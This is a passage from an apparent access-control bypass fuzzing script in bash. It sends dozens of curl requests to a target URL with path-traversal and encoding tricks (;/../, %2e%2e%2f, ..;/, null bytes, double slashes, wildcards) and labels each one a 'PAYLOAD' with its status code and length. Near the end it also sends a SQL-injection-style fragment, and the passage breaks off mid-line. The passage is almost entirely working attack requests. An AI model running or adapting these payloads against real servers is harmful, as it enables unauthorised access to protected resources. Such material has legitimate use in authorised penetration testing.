	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/../../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/../..//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/../..//' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/.././../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/.././../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/../.;/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/../.;/../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/..//' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..//%2e%2e/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/..//%%%%2e%%%%2e/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..//%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/..//%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..//../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/..//../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..///" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/..///' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/../;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/../;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/../;/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/../;/../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/..;' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/.;." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};/.;.' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};//%2f../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};//%%%%2f../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};//.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};//..' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};//../../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};//../../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};///.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};///..' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};///../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};///../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};///..//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};///..//' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};x" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};x' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};x/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};x/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};x;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target};x;' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}&" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}&' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%09" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%09' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}..%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}.././" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}.././' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%00/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}..%%%%00/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%0d/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}..%%%%0d/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%5c" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}..%%%%5c' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..\\" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}..\\\\\\\\\\\\\\\' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%ff" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}..%%%%ff' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2e%2e%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%2e%%%%2e%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}.%2e/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}.%%%%2e/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%3f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%26" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%26' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%23" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%23' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2e" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%2e' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/.' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}?" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}?' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}??" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}??' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}???" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}???' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}//' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/./" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/./' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}.//./" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}.//./' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//?anything" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}//?anything' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}#" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}#' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/.randomstring" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/.randomstring' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}..;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}.html" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}.html' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%20/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%20/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%20${path}%20/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/%%%%20${path}%%%%20/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}.json" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}.json' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}\..\.\\" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}\..\.\\\\\\\\\\\\\\\' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/*" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/*' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}./." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}./.' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/*/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/*/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/..;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/%%%%2e/${path}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/%%%%2e/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}//.' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}////" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}////' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/;${path}/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/;${path}/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/'%20or%201.e(%22)%3D'" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/'%%%%20or%%%%201.e(%%%%22)%%%%3D' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/1.e(ascii" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

